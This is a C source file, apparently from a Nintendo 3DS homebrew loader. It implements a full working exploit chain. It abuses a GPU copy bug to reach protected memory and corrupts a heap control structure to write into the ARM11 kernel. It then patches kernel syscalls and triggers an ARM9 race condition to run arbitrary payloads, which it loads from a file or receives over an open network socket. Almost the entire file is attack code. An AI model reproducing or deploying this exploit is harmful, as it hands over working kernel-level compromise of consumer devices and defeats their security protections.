#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/_default_fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "brahma.h"
#include "exploitdata.h"


// some ugly global vars
struct exploit_data g_expdata;
struct arm11_shared_data g_arm11shared;

/* TODO: replace with heap buffers and
   properly limit maximum size of payload
   so we won't write beyond FCRAM */
u8  g_ext_arm9_buf[ARM9_PAYLOAD_MAX_SIZE];
u32 g_ext_arm9_size = 0;
s32 g_ext_arm9_loaded = 0;
u8  g_is_healed_svc_handler = 0;
s32 g_do_patch_svc = 0;

/* overwrites two instructions (8 bytes in total) at src_addr
   with code that redirects execution to dst_addr */ 
void redirect_codeflow(u32 *dst_addr, u32 *src_addr) {
	*(src_addr + 1) = dst_addr;
	*src_addr = ARM_JUMPOUT;	
}

/* exploits a bug that causes the GPU to copy memory
   that otherwise would be inaccessible to code from
   non-privileged code */
int do_gshax_copy(void *dst, void *src, unsigned int len) {
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	for (i = 0; i < 16; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}
	HB_FlushInvalidateCache();
	linearFree(check_mem);
	return 0;
}

/* fills exploit_data structure with information that is specific
   to 3DS model and firmware version
   
   returns: 0 on failure, 1 on success */ 
int get_exploit_data(struct exploit_data *data) {
	u32 fversion = 0;    
	u8  isN3DS = 0;
	s32 i;
	s32 result = 0;
	u32 sysmodel = SYS_MODEL_NONE;
	
	if(!data)
		return result;
	
	fversion = osGetFirmVersion();
	APT_CheckNew3DS(NULL, &isN3DS);
	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
	
	/* attempt to find out whether the exploit supports 'our'
	   current 3DS model and FIRM version */
	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
		if (supported_systems[i].firm_version == fversion &&
			supported_systems[i].sys_model & sysmodel) {
				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
				result = 1;
				break;
		}
	}
	return result;
}

/* exploits a bug which causes the ARM11 kernel
   to write a certain value to 'address' */
void priv_write_four(u32 address) {
	const u32 size_heap_cblk = 8 * sizeof(u32);
	u32 addr_lin, addr_lin_o;
	u32 dummy;
	u32 *saved_heap = linearMemAlign(size_heap_cblk, 0x10);
	u32 *cstm_heap = linearMemAlign(size_heap_cblk, 0x10);

	svcControlMemory(&addr_lin, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	addr_lin_o = addr_lin + 0x1000;
	svcControlMemory(&dummy, addr_lin_o, 0, 0x1000, MEMOP_FREE, 0); 

	// back up heap
	do_gshax_copy(saved_heap, addr_lin_o, size_heap_cblk);

	// set up a custom heap ctrl structure
	cstm_heap[0] = 1;
	cstm_heap[1] = address - 8;
	cstm_heap[2] = 0;
	cstm_heap[3] = 0;

	// corrupt heap ctrl structure by overwriting it with our custom struct
	do_gshax_copy(addr_lin_o, cstm_heap, 4 * sizeof(u32));
	
	// Trigger write to 'address' 
	svcControlMemory(&dummy, addr_lin, 0, 0x1000, MEMOP_FREE, 0);
   
	// restore heap
	do_gshax_copy(addr_lin, saved_heap, size_heap_cblk);

	linearFree(saved_heap);
	linearFree(cstm_heap);
	
	return;	
}

// trick to clear icache
void user_clear_icache() {
	int i, result = 0;
	int (*nop_func)(void);
	const int size_nopslide = 0x1000;	
	u32 nop_slide[size_nopslide] __attribute__((aligned(0x1000)));		

	HB_ReprotectMemory(nop_slide, 4, 7, &result);

	for (i = 0; i < size_nopslide / sizeof(u32); i++) {
		nop_slide[i] = ARM_NOP;
	}
	nop_slide[i-1] = ARM_RET;
	nop_func = nop_slide;
	HB_FlushInvalidateCache();
	
	nop_func();
	return;
}

/* Corrupts ARM11 kernel code (CreateThread()) in order to
   open a door for ARM11 code execution with kernel privileges. */
int corrupt_arm11_kernel_code(void) {
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int result = 0;
	
	// get system dependent data required for the exploit		
	if (get_exploit_data(&g_expdata)) {
		
		/* prepare system-dependant data required by
		the exploit's ARM11 kernel code */
		
		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
	
		// corrupt certain parts of the svcCreateThread() kernel code
		priv_write_four(g_expdata.va_patch_createthread);
	
		// clear icache from "userland"
		user_clear_icache();
		result = 1;		
	}

	return result;
}

/* TODO: experimental, network code might be moved somewhere else */
int recv_arm9_payload() {
	int sockfd;
	struct sockaddr_in sa;
	int ret;
	u32 kDown, old_kDown;
		
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("[!] Error: socket()\n");
		return 1;
	}

	bzero(&sa, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(BRAHMA_NETWORK_PORT);
	sa.sin_addr.s_addr = gethostid();

    if (bind(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		printf("[!] Error: bind()\n");
		close(sockfd);
		return 1;
	}

	if (listen(sockfd, 1) != 0) {
		printf("[!] Error: listen()\n");
		close(sockfd);
		return 1;
	}

	printf("[x] IP %s:%d\n", inet_ntoa(sa.sin_addr), BRAHMA_NETWORK_PORT);

	int clientfd;
	struct sockaddr_in client_addr;
	int addrlen = sizeof(client_addr);

	fcntl(sockfd, F_SETFL, O_NONBLOCK);

	hidScanInput();
	old_kDown = hidKeysDown();
	while (1) {
		hidScanInput();
		kDown = hidKeysDown();
		if (kDown != old_kDown) {
			printf("[!] Aborted\n");
			close(sockfd);
			return 1;
		}

		clientfd = accept(sockfd, (struct sockaddr*)&client_addr, &addrlen);
		svcSleepThread(100000000);
		if (clientfd > 0)
			break;
	}

	printf("[x] Connection from %s:%d\n\n", inet_ntoa(client_addr.sin_addr),
		ntohs(client_addr.sin_port));

	g_ext_arm9_size = 0;
	g_ext_arm9_loaded = 0;
	
	int recvd;
	int total = 0;
	int remsize = ARM9_PAYLOAD_MAX_SIZE;
	u8 *dst = &g_ext_arm9_buf;
	while ((recvd = recv(clientfd, dst + total, remsize - total, 0)) != 0) {
		if (recvd != -1) {
			total += recvd;
			printf(".");
			g_ext_arm9_size += recvd;
		}
	}
	printf("\n\n[x] Received %d bytes in total\n", total);
	g_ext_arm9_loaded = (g_ext_arm9_size != 0);

	close(clientfd);
	close(sockfd);

	return 1;
}

/* reads ARM9 payload from a given path.
   filename - full path of payload
   buf - ptr to a global buffer that will hold the entire payload
   buf_size - size of the 'buf' variable
   out_size - will contain the payload's actual size

   returns: 0 on failure, 1 on success */
int load_arm9_payload(char *filename) {
	int result = 0;
	s32 fsize = 0;
	
	if (!filename)
		return result; 
	
	FILE *f = fopen(filename, "rb");
	if (f) {
		fseek(f , 0, SEEK_END);
		fsize = ftell(f);
		g_ext_arm9_size = fsize;
		rewind(f);
		if (fsize >= 8 && (fsize < ARM9_PAYLOAD_MAX_SIZE)) {
				u32 bytes_read = fread(&g_ext_arm9_buf, 1, fsize, f);
				result = (g_ext_arm9_loaded = (bytes_read == fsize));
		}
		fclose(f);
	}
	return result;
}

/* copies externally loaded ARM9 payload to FCRAM
   - Please note that the ARM11 payload copies
     the original ARM9 entry point from the mapped
	 FIRM header to offset 4 of the ARM9 payload.
	 Thus, the ARM9 payload should consist of
	 - a branch instruction at offset 0 and
	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */ 
int map_arm9_payload(void) {

	extern void *arm9_start;
	extern void *arm9_end;

	void *src;
	volatile void *dst;
	
	s32 size = 0;
	s32 result = 0;

	dst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
	
	if (!g_ext_arm9_loaded) {
		// defaul ARM9 payload
		src = &arm9_start;
		size = (u8 *)&arm9_end - (u8 *)&arm9_start;
	}
	else {
		// external ARM9 payload
		src = &g_ext_arm9_buf;
		size = g_ext_arm9_size;
	}
	
	// TODO: properly sanitize 'size' (must not overflow fcram)
	if (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {
		memcpy(dst, src, size);
		result = 1;
	}
	
	return result;
}

int map_arm11_payload(void) {

	extern void *arm11_start;
	extern void *arm11_end;
	
	void *src;
	volatile void *dst;
	s32 size = 0;
	u32 offs;
	int result_a = 0;
	int result_b = 0;

	src = &arm11_start;
	dst = (void *)(g_expdata.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
	size = (u8 *)&arm11_end - (u8 *)&arm11_start;
	
	// TODO: sanitize 'size' 
	if (size) {
		memcpy(dst, src, size);
		result_a = 1;
	}

	offs = size;
	src = &g_arm11shared;
	size = sizeof(g_arm11shared);
	
	dst = (u8 *)(g_expdata.va_exc_handler_base_W +
	      OFFS_EXC_HANDLER_UNUSED + offs);

	// TODO sanitize 'size'
	if (result_a && size) {
		memcpy(dst, src, size);
		result_b = 1;
	}

	return result_a & result_b;
}

void exploit_arm9_race_condition() {

	int (* const _KernelSetState)(int, int, int, int) =
	    (void *)g_expdata.va_kernelsetstate;
	
	asm volatile ("clrex");

	/* copy ARM11 payload and console specific data */
	if (map_arm11_payload() &&
		/* copy ARM9 payload to FCRAM */
		map_arm9_payload()) {

		/* patch ARM11 kernel to force it to execute
		   our code (hook1 and hook2) as soon as a
		   "firmlaunch" is triggered */ 	 
		redirect_codeflow(g_expdata.va_exc_handler_base_X +
		                  OFFS_EXC_HANDLER_UNUSED,
		                  g_expdata.va_patch_hook1);
	
		redirect_codeflow(PA_EXC_HANDLER_BASE +
		                  OFFS_EXC_HANDLER_UNUSED + 4,
		                  g_expdata.va_patch_hook2);

		CleanEntireDataCache();
		InvalidateEntireInstructionCache();

		// trigger ARM9 code execution through "firmlaunch"
		_KernelSetState(0, 0, 2, 0);		
		// prev call shouldn't ever return
	}
	return;
}

/* - restores corrupted code of CreateThread() syscall
   - if heal_svc_handler is true, a patch to the ARM11
     Kernel's syscall handler is applied in order to
     remove a certain restriction. This is not really
	 required since we're going to acquire ARM9 svc
	 privileges.*/
void apply_patches (bool heal_svc_handler) {
	asm volatile ("clrex");
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	// repair CreateThread()
	*(int *)(g_expdata.va_patch_createthread) = 0x8DD00CE5;
			
	// heal svc handler (patch it to allow access to restricted SVCs) 
	if(heal_svc_handler && g_expdata.va_patch_svc_handler > 0) {
		*(int *)(g_expdata.va_patch_svc_handler) = ARM_NOP;
		*(int *)(g_expdata.va_patch_svc_handler+8) = ARM_NOP;
		g_is_healed_svc_handler = 1;
	}

	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	return 0;
}

int __attribute__((naked))
launch_privileged_code (void) {
	asm volatile ("add sp, sp, #8\t\n");
	
	// repair CreateThread() but don't patch SVC handler
	apply_patches(g_do_patch_svc);
	// acquire ARM9 code execution privileges
	exploit_arm9_race_condition();
	
	asm volatile ("movs r0, #0\t\n"
			 "ldr pc, [sp], #4\t\n");
}

int run_exploit(int svc_patch) {

	int fail_stage = 0;
	g_do_patch_svc = svc_patch;
	//user_clear_icache();

	/* 3DS and/or firmware not supported, ARM11 exploit failure */
	fail_stage++;
	
	if(corrupt_arm11_kernel_code ()) {
		/* Firmlaunch failure, ARM9 exploit failure*/
		fail_stage++;
		svcCorruptedCreateThread(launch_privileged_code);
	}

	/* we do not intend to return ... */
	return fail_stage;
}